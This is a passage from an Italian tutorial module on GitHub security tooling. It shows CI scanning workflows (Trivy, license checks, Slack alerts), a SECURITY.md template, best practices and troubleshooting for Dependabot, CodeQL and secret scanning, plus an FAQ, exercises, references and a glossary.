    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build image
        run: docker build -t app:scan .
      - name: Trivy scan
        uses: aquasecurity/trivy-action@0.24.0
        with:
          image-ref: 'app:scan'
          format: 'sarif'
          output: 'trivy.sarif'
          severity: 'CRITICAL,HIGH'
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy.sarif'

  # 5. IaC scanning
  iac-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aquasecurity/trivy-action@0.24.0
        with:
          scan-type: 'config'
          format: 'sarif'
          output: 'iac.sarif'
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'iac.sarif'

  # 6. License compliance
  license-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Check licenses
        run: |
          npx license-checker --production --onlyAllow \
            'MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause;ISC;0BSD;CC0-1.0;Unlicense' \
            --excludePrivatePackages
```

### Notifiche e Alerting

```yaml
# .github/workflows/security-notify.yml
name: Security Alert Notification

on:
  # Triggerato quando un nuovo alert viene creato
  code_scanning_alert:
    types: [created]
  secret_scanning_alert:
    types: [created]

jobs:
  notify:
    runs-on: ubuntu-latest
    steps:
      - name: Send Slack notification
        uses: slackapi/slack-github-action@v1.26.0
        with:
          payload: |
            {
              "text": "🔴 Security Alert in ${{ github.repository }}",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*Security Alert*\nRepo: `${{ github.repository }}`\nEvent: `${{ github.event_name }}`\n<${{ github.event.alert.html_url || github.server_url }}/${{ github.repository }}/security|View Alert>"
                  }
                }
              ]
            }
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_SECURITY }}
```

---

## Security Policy e SECURITY.md

### Template Completo

Il file `SECURITY.md` nella root del repository o in `.github/` istruisce i ricercatori su come segnalare vulnerabilità:

```markdown
# Security Policy

## Scope

This security policy applies to:
- [repo-name](https://github.com/org/repo-name)
- [api-service](https://github.com/org/api-service)

Out of scope:
- Third-party dependencies (report directly to the maintainer)
- Social engineering attacks
- Physical attacks

## Reporting

### GitHub Private Vulnerability Reporting (Preferred)

Navigate to the Security tab → "Report a vulnerability"

### Email

security@example.com — Encrypt with our PGP key (fingerprint: ABCD 1234 ...)

## SLA

| Severity | Acknowledgment | Fix Target |
|----------|---------------|------------|
| Critical (CVSS 9.0+) | 24h | 48h |
| High (CVSS 7.0-8.9) | 48h | 1 week |
| Medium (CVSS 4.0-6.9) | 1 week | 1 month |
| Low (CVSS 0.1-3.9) | 2 weeks | Next release |
```

---

## Best Practices

### Strategia di Sicurezza Complessiva

1. **Defense in depth** — Non affidarsi a un singolo strumento. Combinare Dependabot + CodeQL + Secret Scanning + strumenti di terze parti. Ogni layer cattura vulnerabilità diverse.

2. **Shift left** — Integrare i controlli il prima possibile: pre-commit hooks per segreti, IDE plugins per CodeQL, PR checks per dependency review.

3. **Automazione** — Le PR di Dependabot per patch updates dovrebbero essere auto-mergiate quando i test passano. L'intervento umano è necessario solo per major updates.

4. **Triage regolare** — Dedicare tempo settimanale al triage degli alert. Non lasciare che si accumulino. Un backlog di 500 alert è peggio di zero — causa alert fatigue.

5. **Policy organizzativa** — Definire SLA chiari: Critical 24h, High 1 settimana, Medium 1 mese, Low next release. Misurare il MTTR.

6. **Principio del minimo privilegio** — `GITHUB_TOKEN` permissions: specificare sempre i permessi minimi necessari. Non usare `permissions: write-all`.

### Dependabot

1. **Grouping** — Raggruppare gli aggiornamenti per tipo (dev, testing, production) per ridurre il numero di PR.
2. **Auto-merge per patch** — Configurare auto-merge per aggiornamenti patch con CI verde.
3. **Ignorare strategicamente** — Usare `ignore` solo quando documentato, con commento che spiega il motivo.
4. **Monitorare il compatibility score** — GitHub mostra la % di repository che hanno aggiornato senza problemi.

### CodeQL

1. **Query estese** — Usare `security-extended` o `security-and-quality` per copertura più ampia.
2. **Analisi schedulata** — Eseguire full scan settimanale oltre alle analisi sulle PR (cattura vulnerabilità in dipendenze aggiornate).
3. **Custom queries** — Sviluppare query personalizzate per pattern specifici dell'organizzazione.
4. **Threat models** — Configurare i threat models per affinare le sorgenti di input considerate.

### Secret Scanning

1. **Push protection obbligatoria** — Abilitare per tutti i repository dell'organizzazione.
2. **Custom patterns** — Definire pattern per segreti interni (chiavi API con prefisso aziendale, token di servizi interni).
3. **Rotazione immediata** — Quando un segreto viene rilevato, ruotarlo immediatamente anche se il commit è stato rimosso — potrebbe essere in cache, fork, o mirror.
4. **Delegated bypass** — Per Enterprise, richiedere approvazione del team security per bypass.

---

## Troubleshooting

### Dependabot PR Fallisce i Test

```bash
# Causa 1: Breaking change nella dipendenza
# → Verificare il changelog della dipendenza
# → Se il breaking change è intenzionale, aggiornare il codice
# → Se è un bug nel package, aggiungere a ignore temporaneamente

# Causa 2: Conflitto con altra dipendenza (peer dependency)
# → Verificare con: npm ls <package-name>
# → Potrebbe richiedere aggiornamento multiplo

# Causa 3: CI instabile (flaky test)
# → Re-run dei test
# → Se persiste, investigare il test flaky indipendentemente

# Strategia:
gh pr checks <pr-number>  # Vedere quali check falliscono
gh pr diff <pr-number>     # Vedere cosa è cambiato
```

### CodeQL: Troppi Falsi Positivi

```yaml
# 1. Escludere directory non rilevanti
# In codeql-config.yml:
paths-ignore:
  - '**/test/**'
  - '**/tests/**'
  - '**/__mocks__/**'
  - '**/fixtures/**'
  - '**/migrations/**'
  - '**/generated/**'

# 2. Escludere query specifiche con alto false positive rate
query-filters:
  - exclude:
      id: js/unused-local-variable
  - exclude:
      id: py/similar-function
  - exclude:
      tags contain: /maintainability/

# 3. Usare inline suppression nel codice
# JavaScript:
# // lgtm[js/sql-injection] - Input validato in middleware
# Python:
# # lgtm[py/sql-injection] - Parametrizzato via ORM

# 4. Dismissare via API con motivo documentato
gh api repos/{owner}/{repo}/code-scanning/alerts/42 -X PATCH \
  -f state="dismissed" \
  -f dismissed_reason="false positive" \
  -f dismissed_comment="Input sanitizzato dal middleware validateInput()"
```

### CodeQL Analysis Troppo Lenta

```yaml
# 1. Limitare i paths analizzati
paths:
  - src
  - lib

# 2. Per linguaggi compilati, ottimizzare il build
# - Usare cache delle dipendenze
# - Compilare solo i target necessari
# - Disabilitare test durante la compilazione

# 3. Aumentare le risorse del runner
runs-on: ubuntu-latest  # Standard: 7 GB RAM, 2 CPU
# Per analisi grandi:
runs-on: ubuntu-latest-16-cores  # 64 GB RAM, 16 CPU (GitHub-hosted larger runners)

# 4. Aumentare il timeout
timeout-minutes: 360  # Default per CodeQL

# 5. Suddividere l'analisi per linguaggio in job separati (parallelismo)
```

### Secret Scanning: Alert su Segreti di Test

```bash
# Soluzione 1: Risolvere come "used_in_tests"
gh api repos/{owner}/{repo}/secret-scanning/alerts/1 -X PATCH \
  -f state="resolved" \
  -f resolution="used_in_tests"

# Soluzione 2: Non usare formati di segreti reali nei test
# SBAGLIATO: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcde (formato di un vero GitHub token)
# GIUSTO:    test_token_not_real_12345 (non matcha nessun pattern)

# Soluzione 3: Creare un .gitallowed file (per gitleaks)
# .gitleaks.toml
# [allowlist]
# paths = ["**/*_test.go", "**/test/**", "**/fixtures/**"]
# regexes = ["FAKE_.*", "TEST_.*", "DUMMY_.*"]
```

### Push Protection Blocca un Commit Legittimo

```bash
# Caso: il "segreto" è una stringa di test o un placeholder
# Opzioni:
# 1. Rinominare la stringa per non matchare il pattern
# 2. Fare bypass con giustificazione "false positive"
# 3. Per custom patterns: aggiungere un'eccezione al pattern

# Se il bypass URL non funziona:
# → Verificare di avere il permesso di bypass
# → Verificare che la push protection non richieda delegated bypass
# → Contattare l'admin dell'organizzazione
```

### Dependabot Non Crea PR

```bash
# Cause comuni:
# 1. dependabot.yml non presente in .github/dependabot.yml
# 2. Errore di sintassi nel YAML
# 3. open-pull-requests-limit raggiunto (default: 5)
# 4. La dipendenza è nella lista ignore
# 5. Il package ecosystem non è supportato

# Verificare lo stato:
gh api repos/{owner}/{repo}/dependabot/alerts
# Se vuoto, il dependency graph potrebbe non rilevare le dipendenze

# Verificare i log di Dependabot:
# Insights tab → Dependency graph → Dependabot
# Mostra gli errori di parsing del manifest
```

---

## Domande Frequenti (FAQ)

### 1. Dependabot vs Renovate: quale scegliere?

**Dependabot** è integrato in GitHub, zero setup, gratuito. **Renovate** (di Mend.io) ha più funzionalità: automerge più sofisticato, dashboard PR, regex managers per dipendenze custom, group updates migliori. Per repository GitHub puri, Dependabot è sufficiente. Per monorepo complessi o multi-piattaforma, Renovate è spesso preferibile.

### 2. CodeQL è sufficiente come SAST o serve anche Semgrep/SonarQube?

CodeQL eccelle nel taint tracking e nella profondità di analisi, ma copre solo linguaggi specifici. Semgrep ha copertura linguistica più ampia, regole più facili da scrivere, e un marketplace community ricco. SonarQube aggiunge metriche di qualità (code smells, coverage, duplicazione). L'ideale è CodeQL + Semgrep: il primo per vulnerabilità profonde, il secondo per pattern e best practice.

### 3. Secret scanning rileva segreti nei file binari?

No. Secret scanning analizza solo file di testo. Per binari (JAR, ZIP, immagini con EXIF, PDF), servono strumenti dedicati come Yelp/detect-secrets con plugin binari o GitGuardian.

### 4. Posso usare CodeQL su un repository privato senza GHAS?

No. Per repository privati, CodeQL richiede una licenza GHAS. L'alternativa gratuita è usare Semgrep (open source) o CodeQL CLI localmente per analisi ad-hoc senza integrazione nel tab Security di GitHub.

### 5. Come gestisco 500+ alert di Dependabot accumulati?

Prioritizzare: (1) filtrare per severity=critical, risolvere prima quelli. (2) Abilitare grouped updates per ridurre il numero di PR. (3) Auto-merge per patch/minor di dev dependencies. (4) Per dipendenze con molti alert irrisolti, considerare se la dipendenza è ancora necessaria o se esiste un'alternativa mantenuta.

### 6. Push protection blocca anche i commit già nella storia?

No. Push protection blocca solo **nuovi push** che aggiungono segreti. Per segreti già nella storia, si usa il secret scanning retroattivo. Per rimuovere segreti dalla storia: `git filter-repo` o BFG Repo-Cleaner.

### 7. Come integro i risultati di sicurezza in Jira/ServiceNow/PagerDuty?

Opzioni: (1) Webhook di GitHub → Jira integration. (2) GitHub Actions workflow che crea ticket Jira quando un alert viene creato. (3) GitHub API polling da un servizio custom. (4) Tool di terze parti come Snyk, Checkmarx, Mend.io che offrono integrazioni native.

### 8. Dependabot aggiorna anche le dipendenze transitive?

Per security updates: sì, se la vulnerabilità è in una dipendenza transitiva, Dependabot aggiorna la dipendenza diretta che la include. Per version updates: no, aggiorna solo le dipendenze dirette (configurabile con `allow`).

### 9. CodeQL può analizzare codice che non compila?

Per linguaggi interpretati (JavaScript, Python, Ruby): sì, non serve compilazione. Per linguaggi compilati (Java, C/C++, C#, Go, Swift): no, il codice deve compilare perché CodeQL estrae informazioni dal processo di build.

### 10. Come evitare che GITHUB_TOKEN venga usato per lateral movement?

(1) Specificare `permissions:` minime per ogni workflow. (2) Non passare `GITHUB_TOKEN` a step che eseguono codice non trusted. (3) Per workflow da fork (`pull_request_target`), non fare checkout del codice del fork — o se necessario, eseguirlo in un container isolato.

### 11. Secret scanning funziona per segreti in base64 o encrypted?

GitHub rileva pattern base64-encoded per alcuni tipi di token (es. AWS keys encodate). Per segreti custom encrypted, no — serve decodifica prima dell'analisi. Gitleaks supporta custom regex che può matchare pattern base64.

### 12. SLSA provenance è verificabile offline?

Sì. Il provenance attestation è un documento JSON firmato (in-toto format). Puoi verificarlo offline con `slsa-verifier` se hai il certificato di firma (dalla Sigstore transparency log).

---

## Esercizi Pratici

### Esercizio 1 — Setup Completo Dependabot

Creare un repository con un `package.json` che usa 5+ dipendenze (almeno una con vulnerabilità nota). Configurare:
1. `dependabot.yml` con grouping per dev/prod
2. Auto-merge workflow per patch updates
3. Dependency review action per le PR
4. Verificare che gli alert vengano creati e le PR generate

### Esercizio 2 — CodeQL Custom Query

Scrivere una query CodeQL personalizzata che rileva l'uso di `eval()` in JavaScript con input non-literal. Configurare il workflow per eseguirla e verificare che produca alert su codice vulnerabile di test.

### Esercizio 3 — Secret Scanning e Push Protection

1. Abilitare push protection su un repository di test
2. Tentare di pushare un commit con una chiave AWS fittizia (formato valido)
3. Documentare il messaggio di errore ricevuto
4. Eseguire il bypass con giustificazione "used_in_tests"
5. Verificare l'audit log entry creata

### Esercizio 4 — Security Pipeline Completa

Creare un repository con:
- Un'applicazione Express.js con vulnerabilità intenzionali (SQL injection, XSS)
- `dependabot.yml` configurato
- CodeQL workflow con `security-extended`
- Semgrep workflow con regole OWASP
- Trivy workflow per il Dockerfile
- Dependency review su PR
- Gitleaks pre-commit hook

Verificare che ogni vulnerabilità viene rilevata da almeno uno strumento. Documentare quale strumento rileva cosa.

### Esercizio 5 — SLSA Provenance

1. Creare un workflow che genera un artefatto (es. binary Go o bundle npm)
2. Generare SLSA Level 3 provenance con `slsa-github-generator`
3. Verificare la provenance con `slsa-verifier`
4. Allegare la provenance come asset della release
5. Documentare il flusso completo

### Esercizio 6 — Incident Response Drill

Simulare un incidente di sicurezza:
1. Committare "accidentalmente" una chiave API di test
2. Attendere l'alert di secret scanning
3. Seguire la procedura di risposta:
   - Revocare il segreto
   - Rimuovere dalla storia Git con `git filter-repo`
   - Force-push
   - Risolvere l'alert
   - Documentare l'incidente

---

## Letture e Riferimenti

### Documentazione ufficiale

- **GitHub Docs — Dependabot** — Configurazione e gestione degli aggiornamenti automatici delle dipendenze. <https://docs.github.com/en/code-security/dependabot> (consultato: 2026-05-24)
- **GitHub Docs — Code Scanning** — Analisi statica del codice con CodeQL e strumenti SARIF-compatibili. <https://docs.github.com/en/code-security/code-scanning> (consultato: 2026-05-24)
- **GitHub Docs — Secret Scanning** — Rilevamento automatico di credenziali e segreti nei commit. <https://docs.github.com/en/code-security/secret-scanning> (consultato: 2026-05-24)
- **GitHub Docs — Push Protection** — Blocco preventivo dei push che contengono segreti rilevati. <https://docs.github.com/en/code-security/secret-scanning/push-protection-for-repositories-and-organizations> (consultato: 2026-05-24)
- **GitHub Docs — Dependency Review** — Revisione delle modifiche alle dipendenze nelle pull request. <https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/about-dependency-review> (consultato: 2026-05-24)
- **GitHub Docs — Security Advisories** — Gestione e pubblicazione di advisory di sicurezza. <https://docs.github.com/en/code-security/security-advisories> (consultato: 2026-05-24)
- **GitHub Docs — Artifact Attestations** — Generazione di provenance per build tramite attestazioni. <https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds> (consultato: 2026-05-24)
- **CodeQL Documentation** — Documentazione completa del motore di analisi statica CodeQL. <https://codeql.github.com/docs/> (consultato: 2026-05-24)
- **CodeQL Query Library** — Repository delle query CodeQL per tutti i linguaggi supportati. <https://github.com/github/codeql> (consultato: 2026-05-24)
- **GitHub Advisory Database** — Database pubblico delle vulnerabilita note nelle dipendenze open source. <https://github.com/advisories> (consultato: 2026-05-24)

### Strumenti e standard

- **SLSA Framework** — Supply-chain Levels for Software Artifacts: framework per la sicurezza della supply chain. <https://slsa.dev/> (consultato: 2026-05-24)
- **Sigstore** — Infrastruttura per la firma e la verifica crittografica degli artefatti software. <https://www.sigstore.dev/> (consultato: 2026-05-24)
- **SARIF Specification** — Static Analysis Results Interchange Format: formato standard per i risultati di analisi statica. <https://sarifweb.azurewebsites.net/> (consultato: 2026-05-24)
- **OWASP Top 10** — Le 10 vulnerabilita piu critiche nelle applicazioni web. <https://owasp.org/www-project-top-ten/> (consultato: 2026-05-24)
- **Semgrep** — Motore di analisi statica leggero e multi-linguaggio. <https://semgrep.dev/> (consultato: 2026-05-24)
- **Trivy** — Scanner di vulnerabilita per container, filesystem e IaC. <https://trivy.dev/> (consultato: 2026-05-24)
- **Gitleaks** — Strumento per il rilevamento di segreti nella storia Git. <https://gitleaks.io/> (consultato: 2026-05-24)
- **detect-secrets** — Tool di Yelp per il rilevamento di segreti con baseline. <https://github.com/Yelp/detect-secrets> (consultato: 2026-05-24)
- **CycloneDX** — Standard OWASP per Software Bill of Materials (SBOM). <https://cyclonedx.org/> (consultato: 2026-05-24)
- **SPDX** — Standard ISO per l'identificazione di licenze e SBOM. <https://spdx.dev/> (consultato: 2026-05-24)

### Libri e approfondimenti

- Kim G., Humble J., Debois P., Willis J., *The DevOps Handbook* (2nd ed.), IT Revolution Press, 2021. Capitoli su sicurezza integrata nella pipeline.
- Meunier P., *Software Security*, Addison-Wesley, 2020.
- Bass L., Weber I., Zhu L., *DevOps: A Software Architect's Perspective*, Addison-Wesley, 2015.

---

## Riferimenti Incrociati

| Modulo | Relazione |
|---|---|
| [12 — Repository Management](12-github-repository-management.md) | Le policy di sicurezza del repository (branch protection, signed commits) si integrano con lo scanning trattato qui |
| [15 — GitHub API, CLI e Webhooks](15-github-api-cli-webhooks.md) | I webhook notificano eventi di sicurezza (alert Dependabot, secret scanning) per automazione della risposta |
| [17 — GitHub Actions Workflow e Sintassi](17-github-actions-workflow-sintassi.md) | I workflow di scanning (CodeQL, Dependabot, Trivy) usano la sintassi Actions trattata nel modulo 17 |
| [18 — GitHub Actions Avanzate](18-github-actions-avanzate.md) | Le tecniche avanzate (matrix, reusable workflows) ottimizzano le pipeline di sicurezza multi-linguaggio |
| [27 — Supply Chain e Attestation SLSA](27-supply-chain-attestation-slsa.md) | Le attestazioni SLSA e la provenance approfondiscono la sicurezza della supply chain introdotta qui |
| [28 — CodeQL Advanced Security](28-codeql-advanced-security.md) | L'uso avanzato di CodeQL (query custom, data flow analysis) estende l'analisi statica trattata in questo modulo |

---

## Glossario

| Termine | Definizione |
|---|---|
| **Dependabot** | Servizio GitHub che monitora le dipendenze di un progetto e crea automaticamente PR per aggiornare versioni vulnerabili o obsolete. |
| **CodeQL** | Motore di analisi statica semantica di GitHub che tratta il codice come dati interrogabili, rilevando vulnerabilita tramite query QL. |
| **Secret scanning** | Funzionalita GitHub che analizza i commit alla ricerca di pattern di credenziali note (API key, token, password) e genera alert. |
| **Push protection** | Meccanismo che blocca il push di commit contenenti segreti rilevati, impedendo il leak prima che il codice raggiunga il repository remoto. |
| **SAST** | Static Application Security Testing: analisi del codice sorgente senza eseguirlo, alla ricerca di vulnerabilita (es. CodeQL, Semgrep). |
| **SBOM** | Software Bill of Materials: inventario completo delle dipendenze di un progetto, con versioni e licenze, nei formati CycloneDX o SPDX. |
| **SLSA** | Supply-chain Levels for Software Artifacts: framework che definisce livelli di garanzia (L1-L4) per la provenance degli artefatti software. |
| **SARIF** | Static Analysis Results Interchange Format: formato JSON standard per i risultati di analisi statica, supportato dall'interfaccia GitHub. |
| **Dependency graph** | Grafo delle dipendenze dirette e transitive di un repository, usato da Dependabot e dependency review per identificare vulnerabilita. |
| **Security advisory** | Documento che descrive una vulnerabilita di sicurezza in un progetto, con severity CVSS, versioni affette e remediation. |
| **CVE** | Common Vulnerabilities and Exposures: identificatore univoco (es. CVE-2024-12345) per vulnerabilita di sicurezza note. |
| **CVSS** | Common Vulnerability Scoring System: scala 0.0-10.0 che misura la gravita di una vulnerabilita di sicurezza. |
| **Provenance** | Metadati verificabili che attestano dove, come e da chi un artefatto software e stato costruito (build provenance). |
| **Sigstore** | Infrastruttura di firma crittografica che permette di firmare e verificare artefatti software senza gestire chiavi private. |
| **Gitleaks** | Strumento open source per il rilevamento di segreti nella storia Git, utilizzabile come pre-commit hook o in pipeline CI. |
